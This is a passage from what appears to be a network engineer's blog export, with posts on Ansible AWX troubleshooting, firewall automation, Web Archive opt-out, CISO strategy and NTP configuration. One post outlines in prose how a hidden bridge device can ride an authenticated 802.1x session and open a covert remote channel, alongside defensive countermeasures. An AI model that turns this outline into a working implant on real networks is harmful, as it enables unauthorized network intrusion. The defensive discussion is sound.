seemed to do everything needed. However, due to poor documentation, I had to proceed by trial and error. I was almost at the point of writing my own library that directly invoked the native APIs.\nAerleon is a very interesting solution but did not reach the level of detail I needed. Using the CLI was unnecessary because Palo Alto Networks firewalls are fully manageable via native APIs.\nImplementation Currently, the automation is implemented in a single Python file that:\nReads the configuration from the firewall in XML format; Reads the UUID and hit count value for each rule; Deletes objects and rules; Generates new objects and rules, retaining the UUID, and adds them to the XML; Performs some compliance checks; Sorts the rules from most used to least used; Uploads the configuration to the firewall; Applies the configuration. The integration could be added to a CI/CD pipeline and customized based on needs.\nThere are still some things to manage:\nRules that must have a specific order; Security profiles; Support for user groups; Specific customizations that someone will surely need. Conclusions Developing this automation took me about three days of work. Of course, the result is not production-ready but it is a good starting point.\nThe benefits of this approach are objective:\nGreatly reduced operational cost; Responsibility for the rules transferred to those who know the application; Clean configuration; Possibility of continuous checks on the formal correctness of the policy; Improved performance thanks to the ability to order rules by usage. If you think this approach is futuristic, I must reveal that Xavier\u0026rsquo;s talk was based on a real installation at a fairly large international client.\n","cover":"/blog/2024/06/22/palo-alto-firewall-as-code/cover.webp","permalink":"https://www.adainese.it/blog/2024/06/22/palo-alto-firewall-as-code/","title":"Palo Alto Firewall as Code"},{"categories":["books","ciso"],"contents":"This book originates from the authors\u0026rsquo; experience in conducting security incident simulations within companies. The scenarios described are always based on real cases, modified to make them unrecognizable while still usable as tabletop exercises.\nThe goal is to analyze the organization\u0026rsquo;s response to specific incidents, highlighting technical, organizational, and procedural difficulties and shortcomings.\nThe exercises are structured as dialogues between a CISO and their Mentor, dialogues that have actually taken place. The starting point involves a (fictional) company where the CISO works, envisioned as an international manufacturing company with a developed IT infrastructure primarily tied to SAP technologies and internal applications. The IT team is internal and relies on an outsourced SOC service.\nThe workbook is divided into the following chapters:\nPreface Introduction Scenario 1 - Vulnerability Management Scenario 2 - Unauthorized Software Use Scenario 3 - Foreign File Scenario 4 - Access to Confidential Information Scenario 5 - Double Extortion Attack Conclusions ","cover":"/blog/2024/06/11/on-the-other-side-of-the-firewall/cover.webp","permalink":"https://www.adainese.it/blog/2024/06/11/on-the-other-side-of-the-firewall/","title":"On the other side of the Firewall"},{"categories":["automation","infrastructure"],"contents":"For several years now, Ansible AWX has been on my ToDo list. I have always postponed dealing with it due to its complexity, but today I find myself having to tackle it. I knew it would be challenging, but I didn\u0026rsquo;t imagine just how much.\nThis post aims to summarize the steps to install a development instance of AWX and discuss the enormous, unnecessary, and harmful complexity that our infrastructures have reached.\nAWX Operator First and foremost, it\u0026rsquo;s essential to note that AWX is available via containers on the Kubernetes platform. My attempts to run the application in standalone mode or as a simple container on Docker were futile.\nI chose to prepare an Ubuntu Linux 22.04 VM on which I installed Minikube. Minikube, in turn, installs a reduced version of Kubernetes.\nTo summarize:\nMy lab contains a VMware vSphere cluster; Within the cluster, there is a virtualized instance of Ubuntu Linux 22.04; On the Linux system, a Kubernetes environment is virtualized (created through Minikube); On Kubernetes, we install Ansible AWX using the AWX Operator application. For the details of the individual steps, I refer you to the two links by Christopher Hart at the end of the post.\nThe reflection I want to make concerns the complexity of the environment necessary to run what is an orchestrator of playbooks. The probability that something will go wrong in the setup is very high, and debugging any problems requires expertise in many, too many, different environments. Not to mention how to update, backup, restore, or design the disaster recovery process for such a solution.\nReboot After a few hours of use, I realize that my instance of AWX is no longer working correctly. The reason becomes almost immediately apparent: the disk space of the Ubuntu Linux system was exhausted. I extend the disk space and restart the system\u0026hellip; but AWX doesn\u0026rsquo;t seem to start.\nIn order, I verify:\nDocker on Ubuntu Linux; Minikube; Docker within Kubernetes; The AWX containers within Kubernetes. minikube status minikube restart minikube kubectl -- get pods -A minikube service list kubectl logs --namespace=awx -p svc/awx-service kubectl get services --namespace awx After a few minutes, the AWX service responds, but it is not exposed. A few more minutes, and I manage to reach the login page again.\nAnsible Galaxy The playbooks I wrote use the cisco.ios collection, which is installed by default with Ansible, but it seems not to exist in AWX. I discover that there is a specific format for defining the dependencies of an AWX project. You need to create the collections/requirements.yml file indicating the necessary dependencies:\ncollections: - name: cisco.ios version: 8.0.0 source: https://galaxy.ansible.com I rerun the playbook and move on to the next error.\nparamiko vs pylibssh The next error indicates the use of paramiko instead of ansible-pylibssh:\nASK [cisco_ios_system : SETTING FACTS] **************************************** [WARNING]: ansible-pylibssh not installed, falling back to paramiko [WARNING]: ansible-pylibssh not installed, falling back to paramiko ok: [sw1.example.com] ok: [sw2.example.com] TASK [cisco_ios_system : CONFIGURING HOSTNAME AND DOMAIN NAME] ***************** fatal: [sw2.example.com]: FAILED! =\u0026gt; {\u0026#34;changed\u0026#34;: false, \u0026#34;msg\u0026#34;: \u0026#34;No existing session\u0026#34;} fatal: [sw1.example.com]: FAILED! =\u0026gt; {\u0026#34;changed\u0026#34;: false, \u0026#34;msg\u0026#34;: \u0026#34;No existing session\u0026#34;} However, the cisco.ios collection requires the use of ansible-pylibssh, not present by default on Ansible and AWX, which instead use paramiko. With little hope, I force the use of pylibssh, configuring in the inventory:\nansible_network_cli_ssh_type: libssh I rerun the playbook, and indeed the error reports the absence of the library:\nTASK [cisco_ios_system : CONFIGURING HOSTNAME AND DOMAIN NAME] ***************** fatal: [sw1.example.com]: FAILED! =\u0026gt; {\u0026#34;changed\u0026#34;: false, \u0026#34;msg\u0026#34;: \u0026#34;Failed to import the required Python library (ansible-pylibssh) on automation-job-11-m85n8\u0026#39;s Python /usr/bin/python3. Please read the module documentation and install it in the appropriate location. If the required library is installed, but Ansible is using the wrong Python interpreter, please consult the documentation on ansible_python_interpreter\u0026#34;} fatal: [sw2.example.com]: FAILED! =\u0026gt; {\u0026#34;changed\u0026#34;: false, \u0026#34;msg\u0026#34;: \u0026#34;Failed to import the required Python library (ansible-pylibssh) on automation-job-11-m85n8\u0026#39;s Python /usr/bin/python3. Please read the module documentation and install it in the appropriate location. If the required library is installed, but Ansible is using the wrong Python interpreter, please consult the documentation on ansible_python_interpreter\u0026#34;} The above error also shows us that the playbook is executed from a container created specifically for each execution: automation-job-11-m85n8. Investigating, I discover that the container is created for each job from the image quay.io/ansible/awx-ee. The image is defined on AWX in Administration -\u0026gt; Execution Environment.\nSo I need a custom awx-ee image containing the ansible-pylibssh library. After some research, I find that someone has had the same problem as me and has already created an image, although it\u0026rsquo;s a year old. Before embarking on creating a new image, in quick \u0026amp; dirty mode, I decide to use that image to see if I can get a working prototype.\nIn Administrator -\u0026gt; Execution Environments, I add a new image as follows:\nName: AWX EE w pylibssh Image: quay.io/repository/azzeddineslimani/eev_awx_cisco Pull: Always pull container before running I associate this new image with the playbook, restart, and get a new error:\nReceptor detail: Error creating pod: container failed to start, ImagePullBackOff I discover it\u0026rsquo;s a Kubernetes error caused by the inability to download the image. I check manually and indeed see that the image is not present in the docker repository within Kubernetes:\nminikube image ls I try the manual way and force the download:\nminikube image pull quay.io/azzeddineslimani/eev_awx_cisco A few minutes, and the image is correctly downloaded.\nI rerun the playbook, but the error is the same.\n$ kubectl logs -f -n awx automation-job-18-gcwfn Error from server (BadRequest): container \u0026#34;worker\u0026#34; in pod \u0026#34;automation-job-18-gcwfn\u0026#34; is waiting to start: trying and failing to pull image The error is mine: I assumed that not specifying the image version would download the latest available (latest), but it is not the case. I correct the URL using quay.io/azzeddineslimani/eev_awx_cisco:latest and rerun the playbook.\nSame error.\nI come across the following description:\nIf you believe everything is appropriately configured, try pulling the image directly from the command line (using the docker image pull command) with the same values that are specified in your application manifest. If this works, you know the image is accessible, and that the root cause of the problem lies somewhere in Kubernetes. In this case, lack of available resources or networking configuration issues are your most likely culprit.\nSince the image is correct, exists, I deduce that the error is application-related. I delete the image reference, recreate it, and reference it to the playbook.\nI rerun the playbook and encounter the next error.\nBastion host The next error concerns the inaccessibility of devices:\nfatal: [sw1.example.com]: FAILED! =\u0026gt; {\u0026#34;changed\u0026#34;: false, \u0026#34;msg\u0026#34;: \u0026#34;ssh connection failed: ssh connect failed: Timeout connecting to 169.254.1.111\u0026#34;} fatal: [sw2.example.com]: FAILED! =\u0026gt; {\u0026#34;changed\u0026#34;: false, \u0026#34;msg\u0026#34;: \u0026#34;ssh connection failed: ssh connect failed: Timeout connecting to 169.254.1.112\u0026#34;} The reason is simple: my lab environment involves passing through a bastion host, which requires authentication via key. The solution in an environment without containers would be immediate, but containers have no persistence, nor does the automation container created for each job. The solution is the same as seen for the previous paragraph: I need to create a custom awx-ee image.\nOnce again, I go for the quick \u0026amp; dirty way. My goal is to get a working prototype and then figure out how to cleanly resolve the errors I\u0026rsquo;ve encountered.\nI add a route so that the Ubuntu Linux system can directly reach the devices without the need for the bastion host.\nI run the playbook and move on to the new error.\nAuthentication The next error concerns authentication to the devices:\nfatal: [sw1.example.com]: FAILED! =\u0026gt; {\u0026#34;changed\u0026#34;: false, \u0026#34;msg\u0026#34;: \u0026#34;ssh connection failed: Failed to authenticate public key: Access denied for \u0026#39;none\u0026#39;. Authentication that can continue: publickey,keyboard-interactive,password\u0026#34;} fatal: [sw2.example.com]: FAILED! =\u0026gt; {\u0026#34;changed\u0026#34;: false, \u0026#34;msg\u0026#34;: \u0026#34;ssh connection failed: Failed to authenticate public key: Access denied for \u0026#39;none\u0026#39;. Authentication that can continue: publickey,keyboard-interactive,password\u0026#34;} Here too, the error is mine: I chose the wrong type of Ansible Tower: Credentials. The Network type is to be used for devices that require a local connection, while the cisco.ios module has been migrated to network_cli mode, which requires the Machine type. I recreate the credentials using the correct type, update the playbook, and rerun it:\nPLAY RECAP ********************************************************************* sw1.example.com : ok=26 changed=4 unreachable=0 failed=0 skipped=0 rescued=0 ignored=0 sw2.example.com : ok=26 changed=4 unreachable=0 failed=0 skipped=0 rescued=0 ignored=0 Finally, after about 8 hours of work, I get the result.\nConclusions I\u0026rsquo;m definitely getting older, but I also believe I have some good reasons on my side: if to install an orchestrator necessary to automate a series of tasks we have to resort to a complexity like that described in this post, perhaps we are doing something wrong.\nNot only do we have difficulty finding the necessary skills to manage such a system, not only are we ignoring the basic rules that security would impose, but we have no idea how complex applications interact with each other. And we don\u0026rsquo;t even have the tools to understand it anymore.\nAm I exaggerating?\nPerhaps, but for the project I\u0026rsquo;m working on, I need:\nnetwork engineers, who do the low-level design for the involved devices; automation engineers, who write automations based on the given requirements; Kubernetes specialists who manage the orchestrator for me; application specialists (AWX in this specific case) who help me understand if and how I can adapt the orchestrator according to the project\u0026rsquo;s needs; gurus who can understand the language of each described figure, creating a single team that speaks and works together. In this specific case, I remember a discussion between a Kubernetes/OpenShift expert and a network expert on the topic of routing. Same word with two completely different meanings. Good luck.\n","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2024/05/05/the-cost-of-complexity-ansible-awx/","title":"The cost of complexity: Ansible AWX"},{"categories":["personal-security","security","ciso"],"contents":"Web Archive is an online service (non-profit) that has long been recording various websites by archiving them in a virtually permanent manner so that anyone can analyze the history and changes of a specific website.\nI am an advocate of oblivion, and above all, of being in control of one\u0026rsquo;s own data. Additionally, I often use the Web Archive engine for my work and am well aware of the drawbacks that this type of service causes. Although the underlying idea is interesting, I do not like that the service goes to great lengths to make it difficult to opt out.\nThere would indeed be a convenient system to instruct search engines (crawlers) on how to treat a specific website. The robots.txt file would allow each website to define what is allowed to be recorded and what is not. However, Web Archive disregards this.\nLet\u0026rsquo;s see then, as of today, how to be partially ignored by Web Archive. I say partially ignored because it seems that the engine continues to visit pages that are not searchable.\nFirst, the robots.txt file must be configured unnecessarily to instruct Web Archive to ignore the website:\nUser-agent: archive.org_bot Disallow: / Next, add the verify.txt file to the root of the website with the following content:\nplease remove from archive.org Finally, send an email to info@archive.org requesting the deletion of the domain and associated data from the Web Archive archive:\nI am NAME SURNAME owner of EXAMPLE.COM. I\u0026#39;m officially requesting the immediate removal of my site from all archive.org products. The \u0026#34;User-agent: archive.org_bot Disallow: /\u0026#34; code present in our robots.txt file is not being honored. It can be seen at: https://www.example.com/robots.txt I am requesting removal of EXAMPLE.COM from all stored dates, including today, and all days going forward. I have been the sole owner of this domain since inception. I have sent this message from my private address, but you can reply to any address hosted at the domain which should be removed. I have also placed a confirmation message at the following link: https://www.example.com/verify.txt Thank you for your prompt attention. DMCA Notice: I am the site owner and sole copyright holder for each of the domains cited above. This letter is official notification under Section 512(c) of the Digital Millennium Copyright Act (\u0026#34;DMCA\u0026#34;), and I seek the removal of the aforementioned infringing material from your servers. Archive.org does not have any right or permission to reproduce, sell or display my websites in any way, shape or form. I am providing this notice in good faith and with the reasonable belief that rights I own are being infringed. Under penalty of perjury I certify that the information contained in the notification is both true and accurate, and I am the copyright owner and therefore have the authority to act on behalf of the owner of the copyright(s) involved. Thank you for your prompt assistance with this matter. NAME SURNAME EXAMPLE.COM You should receive a confirmation of the deletion shortly.\nLet it be clear, the world will not be better or safer after this action, but it remains an action to consider. More and more services today crawl any public data, even for commercial purposes. Various generative AIs, search engines, surveillance services (Clearview AI), cybercrime come to mind\u0026hellip;\n","cover":"/images/categories/personal-security.webp","permalink":"https://www.adainese.it/blog/2024/04/29/opt-out-from-web-archive/","title":"Opt-out from Web Archive"},{"categories":["books","automation"],"contents":"Network automation arises as a necessity to reduce and enhance operability, standardize working methods, and operate on multiple devices in significantly reduced times. The number of individuals interested in this approach is steadily expanding: starting from network engineer teams, automation is now attracting GRC (Governance Risk and Compliance) teams.\nAlthough there are several frameworks available, offering various approaches, Ansible emerges as an intriguing choice because it doesn\u0026rsquo;t require programming skills, thus offering a notably manageable learning curve.\nThe Ansible Workbook serves as a guide for students in my network automation courses, providing them with useful \u0026ldquo;recipes\u0026rdquo; as suggestions to develop their automations using Ansible. The translation has been automatically generated using generative systems.\nThe workbook is divided into the following chapters:\nIntroduction Installation Inventory One-Time Commands Playbook Constructs Handler Parsers and Filters Password Management Output Performance Bastion Host Final Lab Bonus: Managing Prompts Bonus: Rebooting a Device Bonus: Ansible AWX Prerequisites:\nEVE-NG Workbook ","cover":"/blog/2024/04/27/ansible-workbook/cover.webp","permalink":"https://www.adainese.it/blog/2024/04/27/ansible-workbook/","title":"Ansible Workbook"},{"categories":["life"],"contents":"Alright, here\u0026rsquo;s how I got back into (loving) the cold, and why I did it.\nNormally, I don\u0026rsquo;t spill much about my personal life, but I figured, hey, even this is a form of hacking: hacking oneself. Hacking to me means really understanding something and making it better for your own well-being. In this case, I improved myself out of necessity, as often happens.\nI used to be all about the cold: summers were spent in chilly places like Ireland, Norway\u0026hellip; In winter, I\u0026rsquo;d hit the slopes for snowboarding, in the coldest, highest spots our area had to offer. But over the years, I started feeling the cold more, and since 2013, my vacations have been in warm countries I used to snub: Sicily, Puglia, Sardinia.\nWinter of 2022 - 2023 was brutal for me. At one point, I had a moment of clarity: I realized I was dressing like my 85-year-old grandma, wearing two wool sweaters indoors and still shivering. Only difference? I was half her age. It was time to do something: either make peace with the cold again or pack up and move somewhere warm.\nI started researching, looking for inspiration, until I stumbled upon an event poster that reminded me of Wim Hof\u0026rsquo;s approach, conveniently happening just down the road. I went to the presentation, not expecting much. There\u0026rsquo;s this guy, Daniele, showing up in a t-shirt and shorts. And there I am, layered up with two shirts and a jacket. Consistency is key for me, so props to him. Daniele starts talking about his journey, about how the cold works, about how it changed his life. By the end of the evening, I sign up for his program, which I like to sum up as: cold as a spiritual path.\nA couple of months later, the training begins. I\u0026rsquo;m coming out of a particularly tough time, with some dreams shattered. Thanks to Daniele, who\u0026rsquo;s super knowledgeable, I understand that cold is a spiritual teacher: it demands respect and consistency.\nThen comes the moment of truth: my first exposure to the cold water, 14°C water and about 18°C air temperature. I get in, and within seconds, my hands and feet are screaming. Daniele explains that my blood vessels are constricted and I need to train them, but the pain will subside after a few minutes. And it does.\nThe first big lesson: the pain eventually fades, leaving behind emptiness, peace. Knowing that pain eventually fades was like gaining a new self-awareness. It immediately brought to mind one of Buddha\u0026rsquo;s teachings: everything passes.\nI sink into the water up to my neck. The cold feels like thousands of needles piercing my skin, stealing my breath. I endure for a few minutes and come out realizing I have a long way to go. But I\u0026rsquo;m committed: I don\u0026rsquo;t want to suffer from the cold anymore. I follow Daniele\u0026rsquo;s advice and start training with specific exercises.\nMeanwhile, summer arrives, and I dip into 7°C water, but with much warmer outside temperatures.\nWinter returns: the water at home is 9°C, and a cold shower in the morning becomes an act of pure willpower. No one\u0026rsquo;s forcing me, except myself. Like meditation, it\u0026rsquo;s a free act, except I can control the cold shower, not yet my thoughts in meditation. There are immediate benefits too: nothing wakes you up like a 9°C shower, no coffee can compete.\nA year goes by, and I find myself back at the same spot as my first experience: water at 13.5°C, air temperature at 14.5°C. I\u0026rsquo;ve been craving warmth for weeks, but I persisted. I get into the water: it\u0026rsquo;s not warm, but it\u0026rsquo;s not cold either. No pain. I stay submerged for a good 20 minutes, in the pure silence that oasis provides. Time stops, thoughts cease.\nI come out, warm up, and I\u0026rsquo;m happy with the result.\nBut there\u0026rsquo;s more: the cold has brought me a new energy, one I haven\u0026rsquo;t felt in ages. Now I understand the healing power of the cold: on the physical body, the mind, and the spirit.\n","cover":"/blog/2024/04/26/self-hacking-how-i-learned-to-love-the-cold-again/fontanebianche.webp","permalink":"https://www.adainese.it/blog/2024/04/26/self-hacking-how-i-learned-to-love-the-cold-again/","title":"Self-Hacking: How I learned to love the Cold again"},{"categories":["books","automation"],"contents":"Developing automations that interact with network devices requires having a development environment to test, learn, and experiment with frameworks, integrations, and automations. Virtualization over the years has allowed anyone to have realistic copies of network devices at their disposal. Today, anyone can, and should, have their own development environment.\nIn the past, I developed a web-based application for creating and managing virtual network laboratories: UNetLab, now managed by third parties under the name EVE-NG, which will allow us to implement our testing environment.\nEVE-NG Workbook is the guide for students in my network automation courses so that they can have an independent laboratory where they can study and develop automations and integrations. EVE-NG Workbook is the guide for students in my network automation courses so that they can create their own laboratory. The translation has been automatically generated using generative systems.\nThe workbook is divided into the following chapters:\nIntroduction Prerequisites Installing Ubuntu Linux Installing EVE-NG Customizing EVE-NG Automating the Installation ","cover":"/blog/2024/04/25/eve-ng-workbook-amazon-kindle/cover.webp","permalink":"https://www.adainese.it/blog/2024/04/25/eve-ng-workbook-amazon-kindle/","title":"EVE-NG Workbook (Amazon Kindle)"},{"categories":["ciso","security"],"contents":"I couldn\u0026rsquo;t find a suitable title for this post, in which I try to gather various insights that I\u0026rsquo;ve received in the past few days and that I\u0026rsquo;ve planned, sooner or later, to discuss together with Rocco Sicilia.\nI start with the provocation: the world of Cybersecurity has certainly been under the spotlight for some years now. Provocatively (we\u0026rsquo;ll see the reasons later), I would define it as \u0026ldquo;trendy\u0026rdquo;. There are various hypes that follow one another in creating needs/fears with the aim of selling solutions and services. There\u0026rsquo;s nothing wrong with this, but we need to distinguish acting out of \u0026ldquo;trendiness\u0026rdquo; from strategic action.\nActing out of \u0026ldquo;trendiness\u0026rdquo; is an impulse, aesthetic, sometimes very personal, often done out of emulation, and fundamentally it\u0026rsquo;s difficult to trace the motivation behind some choices. Because it\u0026rsquo;s precisely an impulse. Translated, for the purpose of this post, security measures chosen on impulse are not guided by a strategy and, we have already talked about this several times, they are often ineffective. This mode is extremely widespread and easy to identify: if I ask \u0026ldquo;why\u0026rdquo; a security measure (NAC, firewall, Security Awareness Training Software\u0026hellip;) was implemented, the answer tends to be (I exaggerate and simplify) \u0026ldquo;because\u0026rdquo;. Almost always, these security measures chosen on impulse are not integrated into a process and are not monitored (we have also talked about this).\nStrategic action (summarized) starts with an analysis and inserts security measures into a higher design. Each measure is chosen and inserted with a specific purpose and measured as such. There may be exceptions but they are well documented and temporary (with a certain date). Because an exception weakens the protections we have implemented.\nA real example that touches on the fundamentals: the firewall. All companies have a firewall, whether it\u0026rsquo;s perimeter, dual bastion\u0026hellip; But almost no company defines policies: policies are made by technicians and are often hated because they limit others\u0026rsquo; work. Strategic action starts from the purpose of one\u0026rsquo;s infrastructure, which is to support the business. As such, it must provide services that are implemented through servers. These servers, to function, have connectivity needs and therefore risks. Risks are mitigated by dividing servers into areas and these areas can only communicate with each other under certain rules, which are translated into firewall policies. In the ideal world, I should NEVER find systems publicly exposed and positioned in networks considered secure. However, I find them and they are often historical relics, abandoned, unchecked but, precisely exposed for \u0026ldquo;historical reasons\u0026rdquo;.\nBecause, in companies, security is done by technicians, there is no strength to bring the world of Cybersecurity to the corporate level.\nAnd then the CISO arrives.\nThe responsibility for Cybersecurity is dumped onto the CISO. And I mean \u0026ldquo;dumped\u0026rdquo;: namely, the problem, once relegated to technicians, is now relegated to a manager so that the company can continue to forget about it. Let\u0026rsquo;s start with the basics:\na CISO who doesn\u0026rsquo;t report to the board cannot do his job; a CISO who doesn\u0026rsquo;t have a budget cannot do his job; a CISO who doesn\u0026rsquo;t have veto power cannot do his job; a CISO who is not consulted before any technological choice cannot do his job. It has been said many times: Cybersecurity is a corporate problem, but everyone keeps pretending otherwise. A couple of years ago, I had the opportunity to interview some CEOs of enterprises close to me. The answers were enlightening because they allowed me to enter their mindset and understand their needs. In short: Cybersecurity is not a topic of interest to them, because it\u0026rsquo;s delegated to the CIO / CISO (depending on the company).\nOf course, there are many exceptions, but the dominant behavior I notice is the one I described.\n","cover":"/images/categories/ciso.webp","permalink":"https://www.adainese.it/blog/2024/04/11/cybersecurity-fashion-or-strategy/","title":"Cybersecurity: fashion or strategy"},{"categories":["security","infrastructure"],"contents":"In recent years, Network Access Control (NAC) solutions based on the 802.1x protocol have gained significant traction. Like all security solutions, it is crucial to carefully evaluate their functionality to integrate them into a proper Cybersecurity strategy.\nI understand that this evaluation requires highly specific technical knowledge, and often those assessing rely on what is described in datasheets. This post serves three purposes:\nto raise awareness that incorrectly assessing a security solution exposes organizations to threats; to describe the steps by which a threat actor can exploit weaknesses in NAC solutions, to be informative and therefore understandable even to non-technical individuals. Introduction: NAC solutions First and foremost, an overview of NAC or Network Access Control solutions is necessary. These solutions are based on the 802.1x protocol to authenticate and authorize connected devices. Some solutions, through additional components, also assess device behavior to identify any anomalies.\nThe problem these solutions aim to solve is related to unauthorized access to Ethernet ports by unauthorized devices. Specifically, these solutions protect ports naturally accessible to individuals, particularly in offices and public areas.\nOver time, these solutions have evolved to not only authenticate but also authorize and profile connected devices. In other words, it is possible to dynamically configure Ethernet ports based on connected devices. This functionality greatly aids in improving and automating the management of large and dynamic campus areas.\nDevice authentication is based on the 802.1x protocol: the switch requests authentication from the device, and authentications are validated through external servers. Authentication can occur via username and password or through certificates. Once the device is authenticated, the channel is active until the session expires, which must then be renewed.\nOver time, solutions have evolved to support multiple connected devices, such as:\nPhone with cascaded computers; Computers with virtual machines; \u0026hellip; However, in the real world, there are numerous devices that do not implement the 802.1x protocol. NAC solutions have further \u0026ldquo;evolved\u0026rdquo; (perhaps it would be more correct to say \u0026ldquo;devolved\u0026rdquo;), authenticating devices based on their MAC address: this functionality is called MAB or MAC Address Bypass. It is evident that the term \u0026ldquo;bypass\u0026rdquo; cannot be associated with a security feature, and indeed, we recall that NAC solutions are also used for automation.\nThe most important consideration, however, concerns how an authenticated session is established. 802.1x allows authentication of the channel, not individual packets. Specifically, the switch associates the authenticated session with the MAC address of the device. An attacker can thus insert a malicious device between the authenticated device and the switch, exploiting the authenticated channel.\nThe final consideration concerns what I call \u0026ldquo;silent\u0026rdquo; devices. For NAC solutions to work, connected devices must support 802.1x or transmit at least one packet to make their MAC address known to the switch. Some devices are designed to receive data but not transmit it, making it impossible to use any NAC solution.\nSwitch configuration Switch configuration should be carefully evaluated to minimize risks, which, as we will see later, are still present.\nEach Ethernet port can be configured in various modes depending on the vendor. Examining Cisco switches, the modes are:\nMulti-Host: once the port is authenticated by the connected device, any other device can use the channel (for example, in the case of virtual machines). Multi-Domain: each connected device, belonging to a specific VLAN, must be authenticated (for example, in the case of cascaded phones and computers). Multi-Auth: each MAC address that appears on the Ethernet port must be authenticated. MAB: no real authentication is performed, but only a check that the MAC address is enabled. Where possible, the preference should be, in order, Multi-Auth, Multi-Domain, Multi-Host, MAB (note: definitions depend on the vendor, the important thing is to understand the concept).\nMITM on 802.1x From the attacker\u0026rsquo;s perspective, in the worst-case scenario, inserting oneself between an authenticated device and a switch means being transparent. Specifically, it means, in order:\nforwarding any data to and from the switch without applying any filters to local frames; waiting for the channel to be authenticated; emitting data using only the MAC address and IP address of the authenticated device. There are two possible ways to implement the above:\nbuilding a software switch running in user-space, probably resulting in less optimal performance; leveraging components offered by Linux, thus working in kernel-space with better performance, albeit with some limitations. With reference to the second approach, the three steps translate operationally into:\ncompiling a custom kernel so that all frames are forwarded by Linux Bridge; reading the MAC address of the connected device; analyzing passing data until obtaining the IP address of the connected device and the MAC address of the gateway; configuring a Linux Bridge, iptables, and ebtables so that it is possible to communicate with the outside using the MAC address and IP address of the connected device; activating a covert channel that allows the malicious device to be exploited remotely. The result will be a device practically invisible and remotely manageable.\nDefense strategies Programming a device to transparently exploit an authenticated 802.1x session is not simple but not overly complex either. Therefore, it is necessary to consider the risk that ports with promiscuous access may be compromised as described above.\nFor several years, my approach has been to consider networks with promiscuous access akin to DMZ networks: high-risk areas that require high visibility and very restrictive policies. No assumptions can be made about the security of connected devices.\nA first approach is therefore to increase visibility by adding behavioral analysis of devices: if a printer starts communicating with an unknown remote site, uploading more or less significant data, a red flag should go up somewhere.\nA second approach involves using a zero-trust approach, creating policies that allow only what is strictly necessary, thus limiting the scope of action of any malicious devices. In this regard, the use of Private VLANs can further reduce the attack surface. However, it is always necessary to keep in mind how a device is authenticated: for example, if a specific computer is authenticated based on the user using it, and if following user authentication, firewalls use the user\u0026rsquo;s IP address as the basis for evaluating policies, then this mechanism cannot be considered secure. Indeed, the hypothetical malicious device mentioned above will use the same IP address assigned to the user.\nA third approach, less common but extremely effective, involves using an additional layer consisting of IPSec or similar protocols. This approach, which I like a lot, considers promiscuous networks as if they were public networks: users who authenticate on these networks must use VPN systems to access internal company networks.\nThere is an additional approach, partially applicable, that involves encrypting the device-to-switch channel to make it unusable for MITM attacks. MACSec (802.1ae) is the standard that implements this functionality, but it is not currently natively implemented on endpoint devices. Third-party agents, such as https://www.cisco.com/go/anyconnect, are available and can be installed on client operating systems.\n","cover":"/images/categories/security.webp","permalink":"https://www.adainese.it/blog/2024/03/10/mitm-on-wired-802.1x-with-a-raspberry-pi/","title":"MITM on wired 802.1x with a Raspberry PI"},{"categories":["automation"],"contents":"This article serves as an example to explore different strategies for configuring a feature on network devices using Ansible. Specifically, we will focus on configuring NTP on Cisco IOS devices, although the discussions here can be generalized.\nAs mentioned, in general, there are two possible approaches:\nwe can use specific Ansible modules, specifically cisco.ios.ios_ntp_global; we can use the generic configuration module cisco.ios.ios_config. The two approaches are radically different:\nUsing specific modules delegates all checks regarding idempotence, integrity, and cleanliness of the configuration to the module itself. While the module handles all the work, we need to ensure it behaves correctly (bug-free), supports all the settings we need, and especially, we cannot make any optimizations. Using generic configuration modules allows us flexibility to configure any necessary parameter (very useful in complex configurations involving, for example, BGP, MPLS, QoS\u0026hellip;), but requires us to correctly manage idempotence, cleanliness, and especially optimization. Let\u0026rsquo;s see in detail how to configure NTP on Cisco IOS in the two described modes, starting from a list of NTP peers defined at the configuration level:\nntp_peers: - 0.pool.ntp.org - 1.pool.ntp.org - 2.pool.ntp.org - 3.pool.ntp.org - 4.pool.ntp.org Using the cisco.ios.ios_ntp_global module When using modules that we are not familiar with, it is always good practice to:\nreview the module documentation; perform tests to verify behavior in all possible scenarios; ensure, after any upgrades, that the behavior has changed. Reviewing the documentation immediately reveals that the module wants the list of peers in a different format from ours. Since all parameters are standardized, from a design point of view, it makes sense to keep the list of NTP peers as seen previously, moving the \u0026ldquo;translation\u0026rdquo; of the format into the role:\n- ansible.builtin.set_fact: ntp_peers_config_list: \u0026#34;{{ ntp_peers_config_list|default([]) + [{\u0026#39;peer\u0026#39;: item}] }}\u0026#34; with_items: \u0026#34;{{ ntp_peers }}\u0026#34; We will immediately notice that we are introducing a performance problem that we will address later.\nAt this point, we have a list of NTP peers in the correct format, all we have to do is invoke the module:\n- cisco.ios.ios_ntp_global: config: peers: \u0026#34;{{ ntp_peers_config_list }}\u0026#34; state: replaced The only open point is the state parameter, which can take different values:\nmerged: the added configuration is added to what is already present (any existing NTP peers will not be removed). replaced and overridden: the added configuration replaces what is already present (any existing NTP peers will be removed). deleted: the existing configuration will be removed, and nothing will be configured. In this case, the replaced and overridden modes are identical. In general, behavior should always be checked with the appropriate documentation, but we can say that:\nreplaced: individual configurations present in the device and not expected are first removed and then correctly reinserted. overridden: all the configuration present in the device is deleted and then correctly reinserted. If in the cisco.ios.ios_config module the behavior is identical, in the cisco.ios.ios_acls module the behavior differs because ACLs are composed of sub-blocks:\nreplaced in this case removes individual ACEs (access control entries) from each ACL, and then inserts the correct ACEs. overridden in this case deletes the ACLs and then reinserts them correctly. There are then three values that will not modify the state of the configuration and that can be used for other elaborations, such as debugging:\nrendered: the configuration that would be added is saved in output in the rendered key. gathered: the configuration present on the device is read and saved in output in JSON format using the gathered key. parsed: like gathered but the input is not the device configuration, but what is present in the running_config variable. The output is saved in JSON format using the parsed key. Given the complexity of the configurations that can be performed on network devices, it should be clear why it is important to verify that the module behaves as expected, supports the configurations we need, and that the behavior remains the same in case of updates.\nThe configuration is not saved automatically at the end of the task: it is clear that in a playbook that invokes dozens of different modules, if the configuration were saved after each task, we would have a possible performance problem. Furthermore, we must bear in mind that, since we are effectively doing text scraping, the execution of each module involves reading the configuration using the show running-config command: this can generate an additional performance problem.\nUsing the generic module The generic module cisco.ios.ios_config gives us complete freedom to add and remove any configuration we can think of. It remains up to us, if we deem it appropriate, to manage idempotence, correctness, and efficiency.\nThe cisco.ios.ios_config module:\nLike in the previous case, it automatically executes the show running-config command. The output will be used to verify if certain commands already exist and thus heavily influences the changed state. For example, if we configure int e0/0, with each execution Ansible will re-enter the configuration because interface Ethernet0/0 is present instead in the configuration. We deduce that 